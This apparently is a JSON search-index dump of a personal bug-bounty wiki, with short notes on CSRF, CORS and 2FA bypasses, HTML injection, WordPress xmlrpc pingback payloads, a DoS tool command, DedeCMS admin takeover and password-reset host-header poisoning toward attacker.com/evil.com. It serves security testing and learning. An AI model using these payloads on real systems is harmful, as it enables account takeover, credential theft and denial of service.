123456https:&#x2F;&#x2F;www.target.com&#x2F;adminhttps:&#x2F;&#x2F;www.target.com&#x2F;admin-consolehttps:&#x2F;&#x2F;www.target.com&#x2F;consolehttps:&#x2F;&#x2F;admin.target.comhttps:&#x2F;&#x2F;admin-console.target.comhttps:&#x2F;&#x2F;console.target.com get access from third party search the service default credentials if the admin is working on a third party bypass to get access to login page when visiting admin login page is denied, use header injection to bypass, eg, X-Orginal-URL: /admin or X-Rewrite-URL:/admin","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"MFA bypass","date":"2021-04-14T06:09:50.000Z","path":"wiki/MFA-bypass/","text":"MFA bypasses https://kathan19.gitbook.io/howtohunt/mfa-bypass/mfa_bypasses 2FA bypass https://kathan19.gitbook.io/howtohunt/mfa-bypass/2fa_bypass","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"JWT attack","date":"2021-04-14T06:07:42.000Z","path":"wiki/JWT-attack/","text":"https://kathan19.gitbook.io/howtohunt/jwt-attack/jwt_attack https://xz.aliyun.com/t/9376","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"IDOR","date":"2021-04-14T06:06:57.000Z","path":"wiki/IDOR/","text":"https://kathan19.gitbook.io/howtohunt/idor/idor","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"HTML-injection","date":"2021-04-14T06:03:35.000Z","path":"wiki/HTML-injection/","text":"Password reset links are usually addressed to your account name followed by the reset link. Also if the application allows you to have your account name with tags and special characters then you should try this. steps Create ur acc, edit the name to&lt;h1&gt;attacker&lt;/h1&gt; or &quot;abc&gt;&lt;h1&gt;attacker&lt;/h1&gt;and save it. request a password reset n check the reset email. see if the &lt;h1&gt; tag executed. tips HTML injection are usually considered as low to medium severity bugs but you can escalate the severity by serving a malicious link by using &lt;a href&gt; for eg:&lt;h1&gt;attacker&lt;/h1&gt;&lt;a href=&quot;your-controlled-domain&quot;Click here&lt;/a&gt; You can redirect the user to your malicious domain and serve a fake reset password page to steal credentials Also you can serve a previously found XSS page and steal user cookies etc.","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Host-header attack","date":"2021-04-14T06:01:54.000Z","path":"wiki/Host-header-attack/","text":"https://kathan19.gitbook.io/howtohunt/host-header-attack/host-header","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"HTTP desync attack","date":"2021-04-14T06:00:45.000Z","path":"wiki/HTTP-desync-attack/","text":"HTTP request smuggling how to doref: https://portswigger.net/web-security/request-smuggling/findinghttps://portswigger.net/web-security/request-smuggling/exploitinghttps://portswigger.net/research/http-desync-attacks-request-smuggling-rebornhttps://paper.seebug.org/1048/ toolshttps://github.com/defparam/smugglerhttps://github.com/PortSwigger/http-request-smuggler testing labhttps://portswigger.net/web-security/request-smuggling","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Find origin IP","date":"2021-04-14T05:59:37.000Z","path":"wiki/Find-origin-IP/","text":"https://kathan19.gitbook.io/howtohunt/find-origin-ip/findorigin","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"File upload bypass","date":"2021-04-14T05:57:46.000Z","path":"wiki/File-upload-bypass/","text":"File upload bypass bypassing normal extension sth.php.jpg or sth.jpg.php bypassing the magic byte validation polyglots https://www.codenong.com/cs106601908/ .htaccess https://writeup.ctfhub.com/Skill/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/igWAbQLuV5hDSjGssDxLpa.html %00截断 https://www.cnblogs.com/miansj/p/13996032.html 双写绕过 https://cloud.tencent.com/developer/article/1376933","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"EXIF geo data not stripped","date":"2021-04-14T05:56:04.000Z","path":"wiki/EXIF-geo-data-not-stripped/","text":"EXIF geo data not stripped (sensitive info leaked) toolshttp://exif.regex.info/exif.cgi","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Source code review","date":"2021-04-14T05:50:11.000Z","path":"wiki/Source-code-review/","text":"important functions first When reading source code, focus on important functions such as authentication, password reset, state-changing actions and sensitive info reads. (What is the most important would depend on the application.) Then, review how these components interact with other functionality. Finally, audit other less sensitive parts of the application. follow user input Another approach is to follow the code that processes user input. User input such as HTTP request parameters, HTTP headers, HTTP request paths, database entries, file reads, and file uploads provide the entry points for attackers to exploit the application’s vulnerabilities.This may also help us to find some critical vulnerabilities like xxe,xxs,sql injection hard-coded secrets n credentials Hard-coded secrets such as API keys, encryption keys and database passwords can be easily discovered during a source code review. You can grep for keywords such as “key”, “secret”, “password”, “encrypt” or regex search for hex or base64 strings (depending on the key format in use). use of dangerous functions n outdated dependencies Unchecked use of dangerous functions and outdated dependencies are a huge source of bugs. Grep for specific functions for the language you are using and search through the dependency versions list to see if they are outdated. developer comments, hidden debug functionalities, configuration files, and the .git directory These are things that developers often forget about and they leave the application in a dangerous state. Developer comments can point out obvious programming mistakes, hidden debug functionalities often lead to privilege escalation, config files allow attackers to gather more information about your infrastructure and finally, an exposed .git directory allows attackers to reconstruct your source code. hidden paths, deprecated endpoints, and endpoints in development These are endpoints that users might not encounter when using the application normally. But if they work and they are discovered by an attacker, it can lead to vulnerabilities such as authentication bypass and sensitive information leak, depending on the exposed endpoint. weak cryptography or hashing algorithms This is an issue that is hard to find during a black-box test, but easy to spot when reviewing source code. Look for issues such as weak encryption keys, breakable encryption algorithms, and weak hashing algorithms. Grep for terms like ECB, MD4, and MD5. missing security checks on user input and regex strength Reviewing source code is a great way to find out what kind of security checks are missing. Read through the application’s documentation and test all the edge cases that you can think of. A great resource for what kind of edge cases that you should consider is PayloadsAllTheThings.(github) missing cookie flags Look out for missing cookie flags such as httpOnly and secure. unexpected behavior, conditionals, unnecessarily complex and verbose functions Additionally, pay special attention to the application’s unexpected behavior, conditionals, and complex functions. These locations are where obscure bugs are often discovered. How to download the index.php source code? index.php.bak Vim 临时生成的缓存： 第一次意外退出，生成缓存文件 .filename.txt.swp (注意最前面有个.) 第二次生成 .filename.txt.swo， 第三次生成 .filename.txt.swn 需要用vim -r file 打开 各种其它泄漏文件后缀： .git/ (https://github.com/BugScanTeam/GitHack) git log: 注意查看git历史;ref:https://writeup.ctfhub.com/Skill/Web/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/Git%E6%B3%84%E9%9C%B2/5YAMX5UKxbg5Z2XBCHhxPY.html stash: 查找stash: git stash list; git stash pop; 没有查到stash记录的方法： cat .git/refs/stash 拿到stash的hash; git diff the hash .svn/ (https://github.com/kost/dvcs-ripper.git): * wc.db-nodes中记录了服务器文件名 * 该工具的优势是下载了文件的同时也下载svn的源码结构 Mercurial/HG (https://github.com/kost/dvcs-ripper.git) * .DS_Store (python-dsstore)","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Check list","date":"2021-04-14T05:48:45.000Z","path":"wiki/Check-list/","text":"Web application pentesting checklisthttps://kathan19.gitbook.io/howtohunt/checklist/web-application-pentesting-checklist Web checklist 2https://github.com/KathanP19/HowToHunt/blob/master/CheckList/Web_Checklist_by_Chintan_Gurjar.pdf Web checklist 3https://github.com/KathanP19/HowToHunt/blob/master/CheckList/mindmap.png bug-bounty checklisthttps://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Finding CVEs","date":"2021-04-14T05:45:24.000Z","path":"wiki/Finding-CVEs/","text":"CVEs steps Grab all the subdomains i.e, subfinder -d domain.com | tee -a domains.txt Grap all alive domains i.e, cat domains.txt | httpx -status-code | grep 200 | cut -d “ “ -f1 | tee -a alive.txt Run nuclei basic-detection,panels,workflows,cves templates differently and store results in different file. i.e, cat alive.txt | nuclei -t nuclei-templates/workflows | tee -a workflows. Read each output carefully with patience. Find interest tech used by target. i.e, jira put that link into browser check the version used by target. Go on google search with jira version exploit. grep the cves Go to twitter in explore tab search CVE(that you found from google) poc or CVE exploit Go to google and put cve or some details grab from twitter for a better poc read writeups related to that. Try all cves if success report it.:)","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"CSRF","date":"2021-04-14T05:43:34.000Z","path":"wiki/CSRF/","text":"CSRF https://kathan19.gitbook.io/howtohunt/csrf/csrf CSRF bypass -Change Request Method [POST =&gt; GET] -Remove Total Token Parameter -Remove The Token, And Give a Blank Parameter -Copy a Unused Valid Token , By Dropping The Request and Use That Token -Use Own CSRF Token To Feed it to Victim -Replace Value With Of A Token of Same Length -Reverse Engineer The Token -Extract Token via HTML injection -Switch From Non-Form Content-Type: application/json or Content-Type: application/x-url-encoded To Content-Type: form-multipart -Change/delete the last or frist character from the token -Change referrer to Referrer -Bypass the regex If the site is looking for “bank.com” in the referer URL, maybe “bank.com.attacker.com” or “attacker.com/bank.com” will work. -Remove the referer header (add this in your payload or html code) -Clickjacking (https://owasp.org/www-community/attacks/Clickjacking) Exploiting clickjacking on the same endpoint bypasses all CSRF protection. Because technically, the request is indeed originating from the legitimate site. If the page where the vulnerable endpoint is located on is vulnerable to clickjacking, all CSRF protection will be rendered irrelevant and you will be able to achieve the same results as a CSRF attack on the endpoint, albeit with a bit more effort.","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"CORS","date":"2021-04-14T03:49:41.000Z","path":"wiki/CORS/","text":"CORSref: https://www.packetlabs.net/cross-origin-resource-sharing-cors/ misconfigured CORS hunting method 1 (single target) crawl the target website n search Access-Control using burp Try to add Origin Header i.e, Origin:attacker.com or Origin:null or Origin:attacker.target.com or Origin:target.attacker.com If origin is reflected in response means the target is vuln to CORS hunting method 2 (multiple means including subdomains) find alive subdomains (i.e, subfinder -d domain.com -o target.txt; grep alive: cat target.txt | httpx | tee -a alive.txt), send each subdomain into burp same as above method automated tools https://github.com/chenjj/CORScanner https://github.com/lc/theftfuzzer https://github.com/s0md3v/Corsy https://github.com/Shivangx01b/CorsMe CORS bypass Origin:null Origin:attacker.com Origin:attacker.target.com Origin:attackertarget.com Origin:sub.attackertarget.com Origin:attacker.com and then change the method Get to post/Post to Get Origin:sub.attacker target.com Origin:sub.attacker%target.com Origin:attacker.com/target.com https://twitter.com/trbughunters/status/1287023673845612546 https://twitter.com/Paresh_parmar1/status/1265251507655630848 https://www.corben.io/tricky-CORS/ https://medium.com/@virus0x01/cors-misconfiguration-leading-to-private-information-disclosure-3034cfcb4b93","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"CMS","date":"2021-04-14T03:42:59.000Z","path":"wiki/CMS/","text":"指纹识别 Wappalyzer WordpressWordpress Detection Wappalyzer WhatRuns BuildWithGeneral Scan Tool WpScanxmlrpc.php one of the common issue on wp, to get credit, u need to fully exploit n show the impact. detection: site.com/xmlrpc.php Get the error message about POST request only exploitref: https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/https://the-bilal-rizwan.medium.com/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32 Intercept the request and change the method GET to POST List all Methods1234&lt;methodCall&gt;&lt;methodName&gt;system.listMethods&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt; pingback.ping DDoS 1234567&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt; pingback.ping SSRF (internal PORT scan only) 1234567&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;&#x2F;methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;YOUR SERVER &gt;:&lt;port&gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;http:&#x2F;&#x2F;&lt;SOME VALID BLOG FROM THE SITE &gt;&lt;&#x2F;string&gt;&lt;&#x2F;value&gt;&lt;&#x2F;param&gt;&lt;&#x2F;params&gt;&lt;&#x2F;methodCall&gt; toolsxmlrpc-scan https://github.com/nullfil3/xmlrpc-scan CVE-2018-6389 (wp &lt;= 4.9.3) detection https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9 exploit use DDoS (Doser https://github.com/quitten/doser.py) 1python3 doser.py -t 999 -g &#39;https:&#x2F;&#x2F;site.com&#x2F;fullUrlFromLoadsxploit&#39; WP Cornjob DOS detection view site.com/wp-cron.php, You will see a Blank page with 200 HTTP status code exploit same tool as above (Doser) 1You will see a Blank page with 200 HTTP status code ref: https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30 WP User Enumeration site.com/wp-json/wp/v2/users/ mostly not acceptable, can be used to extend the impact tho Dedecmswin版本后台目录爆破https://xz.aliyun.com/t/2064 利用会员密码重置漏洞重置管理员密码关闭会员注册如何重置管理员密码在Dedecms中，管理员登录过后台，就会在data目录下有一个相应的session（eg:192.168.102.194/uploads/data/session_40b6938a56）文件。通过目录遍历获取session值（sess_blabla），通过editcookie修改cookie(blabla)，进入后台。 后台内恶意执行在模板的标签源码碎片管理中插入一段恶意代码，即可执行任意命令。","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Bypassing CSP","date":"2021-04-14T03:41:53.000Z","path":"wiki/Bypassing-CSP/","text":"CSP (Content Security Policy) bypass ref: https://kathan19.gitbook.io/howtohunt/bypassing-csp/csp_bypass https://brutelogic.com.br/blog/csp-bypass-guidelines/","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Broken auth and session management","date":"2021-04-14T03:35:41.000Z","path":"wiki/Broken-auth-and-session-management/","text":"Session based bugs Old session does not expire log in the account through two browser(eg. firefox n chrome) change pwd or reset pwd on one browser, then refresh the other browser to see if still logged in Session hijacking (intended behavior) login the acc copy all cookies n logout paste the cookies n refresh Password reset link token not expire (insecure configurability) create acc, request a forget pwd link don’t use it, instead, change the email to new one now use the forget pwd link to sent info to the old email n see if pwd is able to change Server security misconfiguration login, play around n logout, goback one page, see if acc is logged in or can view pages limits to the user","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Broken-link hijacking","date":"2021-04-14T03:23:22.000Z","path":"wiki/Broken-link-hijacking/","text":"Test manual check the external link broken-link-checker blc -rof –filter-level 3 https://example.com/ register the broken link or try to get that username or url extra ways: https://ahrefs.com/broken-link-checker https://brokenlinkcheck.com/","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Authentication bypass","date":"2021-04-14T03:17:59.000Z","path":"wiki/Authentication-bypass/","text":"2FA bypass Response Manipulation change the response value of (eg: login) success to ‘true’ from ‘false’ Status Code Manipulation change the status code from 4xx to 200 to see if if can bypass 2FA Code Leakage in Response check the response of the 2FA Code Triggering Request to see if the code is leaked JS File Analysis (rare) some JS files may contain info about the 2FA code 2FA Code Reusability same code can be reused Lack of Brute-Force Protection (possible) Missing 2FA Code Integrity Validation Code for any user acc can be used to bypass the 2FA CSRF on 2FA Disabling signup for two account -&gt; Login into attacker account &amp; capture the disable 2FA request -&gt; generate CSRF POC with .HTML extension -&gt; Login into victim account and fire the request — — -&gt; It disable 2FA which leads to 2FA Bypass. Password Reset Disable 2FA 2FA gets disabled on password change/email change Backup Code Abuse ref: https://medium.com/@surendirans7777/2fa-bypass-techniques-32ec135fb7fe Clickjacking on 2FA Disabling Page misleading victim to disable the 2FA for the 2FA disabling page Enabling 2FA doesn’t expire Previously active Sessions if the previous session is hijacked n app has session timeout vlun Bypass 2FA with null or 000000 enter null or 000000 to bypass OTP bypass by repeating requests Test create an acc with a non-existing ph num intercept the request n send to repeater n forward change the non-existing num to attacker num, get the OTP n register that non-existing numref: https://medium.com/@AGNIHACKERS/otp-bypass-through-response-manipulation-beeb467359d8 OTP bypass via response manipulation change any status, false, error, 0, to true, success, 1. And see if it can bypass the OTP ref: https://medium.com/@MAALP/authentication-bypass-using-response-manipulation-6c33eb1257ac","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Application level DoS","date":"2021-04-14T03:06:52.000Z","path":"wiki/Application-level-DoS/","text":"Email bounce issues https://infosecwriteups.com/an-unexpected-bounty-email-bounce-issues-b9f24a35eb68 Long password DoS Test Test in Forgot Password Page n Change Password, cuz the registration usually have length limit but others don’t. Use a password around 150-200 words to check if there has length limit. Then choose a longer password n keep checking the response time, to see if the app crashes for few seconds. reason: The long password will cause a problem while hashing it for storing in dataset. Long string DoS Test Create app and put field like username or address or even profile picture name parameter (second reference) like 1000 character of string . Search A’s account from B’s account either it will either keeping searching for long time or crash(500 Error code). ref: https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0 https://hackerone.com/reports/764434","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Account Takeover Methodology","date":"2021-04-14T02:44:43.000Z","path":"wiki/Account-Takeover-Methodology/","text":"Chaining Low Impact Bugs with Xss Have a session hijacking -&gt; Look for xss to stole the cookies n expand the impact No Rate Limit On Login with Weak Password Policy The target has weak password policy -&gt; Create a (very) weak password n brute force this account to show the POC Password Reset Poisoning Leads To Token Theft Password reset poisoning: Go to password reset function -&gt; Enter email n intercept Change host header to some other host i.e,* Host:target.com * Host:attacker.com also try to add some headers without changing host like* X-Forwarded-Host: evil.com * Referrer: https ://evil.com Forward this if you found that in next request attacker.com means you successfully theft the token.:) Using CSRF Using CSRF: Change Password function Email change Change Security Question Using Sensitive Data Exposure git recon google recon Token Leaks In Response Token leaks in response: For registration: Intercept the signup request that contains data you have entered. Click on action -&gt; do -&gt; intercept response to this request. Click forward. Check response it that contains any link,any token or otp(one-time password). For password reset: Intercept the forget password option. Click on action -&gt; do -&gt; intercept response to this request. Click forward. Check response it that contains any link,any token or otp.","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"Notes for HowToHunt.md","date":"2021-04-08T08:05:57.000Z","path":"wiki/Notes-for-HowToHunt-md/","text":"Account takeover Have a session hijacking -&gt; Look for xss to stole the cookies n expand the impact The target has weak password policy -&gt; Create a (very) weak password n brute force this account to show the POC Password reset poisoning: Go to password reset function -&gt; Enter email n intercept Change host header to some other host i.e,* Host:target.com * Host:attacker.com also try to add some headers without changing host like* X-Forwarded-Host: evil.com * Referrer: https ://evil.com Forward this if you found that in next request attacker.com means you successfully theft the token.:) Using CSRF: Change Password function Email 